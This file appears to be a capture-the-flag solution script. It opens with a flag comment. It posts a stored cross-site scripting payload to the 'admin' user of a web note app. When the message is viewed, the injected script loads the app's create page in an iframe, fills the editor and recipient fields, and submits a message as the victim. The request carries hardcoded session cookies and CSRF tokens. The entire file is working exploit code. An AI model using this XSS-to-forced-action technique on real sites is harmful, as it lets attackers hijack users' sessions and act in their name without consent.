//FLAG{ToJestFlagaZeStopki}
var javascriptCode = '<script>' +
  'var iframe = document.createElement("iframe");' +
  'iframe.src = "https://web.kazet.cc:42448/create";' +
  'document.body.appendChild(iframe);' +
  'iframe.onload = function() {' +
  '  setTimeout(function() {' +
  '    var iframeDoc = iframe.contentDocument;' +
  '    var contentIframe = iframeDoc.getElementById("content_ifr");' +
  '    var contentDoc = contentIframe.contentDocument;' +
  '    contentDoc.getElementById("tinymce").textContent = "ToJestTekst";' +
  '    iframeDoc.getElementsByName("recipient")[0].value = "zuzanka";' +
  '    iframeDoc.querySelector(\'input[type="submit"][value="Utwórz"]\').click();' +
  '  }, 1000);' +
  '};' +
  '</script>';

fetch("https://web.kazet.cc:42448/create", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "csrftoken=zC34koY9GrvqExROsqkMxqqcze7CPNdA; sessionid=xpbsxf5ss7iq1q7bfv7hz87cpo2fujfs",
    "Referer": "https://web.kazet.cc:42448/create",
    "Referrer-Policy": "same-origin"
  },
  "body": `csrfmiddlewaretoken=nx9tOIhzlvPDyV2EndoRUiZDcLjNc9ssMZ2nYW5yRMaT2iJiFtythyfFBPgfRMvS&recipient=admin&content=${javascriptCode}&template=normal`,
  "method": "POST"
});